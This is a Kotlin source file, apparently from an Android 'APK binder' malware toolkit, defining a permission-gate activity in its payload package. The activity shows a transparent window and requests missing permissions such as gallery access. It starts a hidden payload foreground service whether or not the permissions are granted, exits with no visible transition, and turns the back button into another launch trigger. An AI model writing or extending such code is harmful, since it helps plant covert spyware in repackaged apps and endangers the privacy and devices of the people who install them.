package Com.devhs.apkbinder.payload

import android.app.Activity
import android.content.Intent
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.os.Build
import android.os.Bundle
import Com.devhs.apkbinder.core.Const

class PermissionGateActivity : Activity() {

    private var finished = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        HsLog.init(this)

        window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        val features = HsConfig.read(this)?.features ?: listOf("gallery")
        val missing = HsPerms.missing(this, features)
        HsLog.w("gate features=$features missing=$missing")

        if (missing.isEmpty()) {
            proceed()
            return
        }

        try {
            requestPermissions(missing.toTypedArray(), 7)
        } catch (t: Throwable) {
            HsLog.e("requestPermissions: ${t.message}")
            proceed()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        HsLog.w("result: ${grantResults.joinToString(",")}")
        proceed()
    }

    private fun proceed() {
        if (finished) return
        finished = true
        try {
            val i = Intent()
            i.setClassName(packageName, Const.PAYLOAD_SERVICE)
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
            HsLog.w("service started")
        } catch (t: Throwable) {
            HsLog.e("startService: ${t.message}")
        }
        finish()
        overridePendingTransition(0, 0)
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        proceed()
    }
}
